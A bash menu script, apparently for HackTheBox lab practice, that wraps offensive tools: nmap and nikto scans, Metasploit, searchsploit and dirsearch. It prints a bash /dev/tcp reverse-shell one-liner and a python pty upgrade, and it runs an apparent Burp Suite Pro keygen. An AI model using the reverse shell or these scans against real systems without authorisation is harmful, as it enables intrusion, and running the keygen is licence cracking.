#! /bin/bash
ReverseShell(){
	read -p "ip: " ip 
	read -p "port: " port
	echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
}
Nmap(){

       read -p "ip:" ip
       read -p "Box name:" name
       nmap -sC -sV -oA /root/Desktop/hackthebox/$name/nmap.txt $ip 

}
Nikto(){

	read -p "ip:" ip
	read -p "req type: 1.http 2.https:" req
	read -p "Box name:" name
	if [ $req == 1 ]
	then
		nikto --url http://$ip > /root/Desktop/hackthebox/$name/nikto.txt
	else 
		nikto --url https://$ip > /root/Desktop/hackthebox/$name/nikto.txt	

	fi	
}


Msfconsole(){
		service postgresql start
		service postgresql status
		msfdb init
		msfconsole
}
PythonPty(){
	echo "python -c 'import pty; pty.spawn("/bin/bash")'"
}
Vpnsetup(){
	openvpn /root/Desktop/hackthebox/Sherisk.ovpn
}
Searchsploit()
{
  read -p "Enter the flag if no flag enter no:" flag
  read -p "Enter the label:" label
  if [ $flag == "no" ]
  then 
	  searchsploit $label
  else
	  searchsploit -$flag $label
  fi
}
DirectorySearch(){

read -p "Enter ip or hostname:" ip
read -p "box name:" box
python3 /root/Desktop/hackthebox/dirsearch-master/dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -e php -f -t 30 -u http://$ip 

}

Burpsuite(){
	java -jar /root//BurpSuitePro-2.0.11-Beta/BurpKeygen.jar
}
read -p "Here is the list:
	1.Revershell echo scrip
	2.Nmap scan
	3.Nikto scan
	4.Msfconsole
	5.PythonPty
	6.Vpnsetup
	7.Searchsploit
	8.DirectorySearch
	9.Burpsuite	
	" Number

case $Number in
	1)
		ReverseShell
		;;
	2)
		Nmap
		;;
	3)
		Nikto
		;;
	4)
		Msfconsole
		;;
	5)
		PythonPty
		;;
	6)	
		Vpnsetup
		;;
	7)
		Searchsploit
		;;
	8)
		DirectorySearch
		;;
	9)
		Burpsuite
		;;
	*)
		echo "you need to select from above list"
		;;
esac
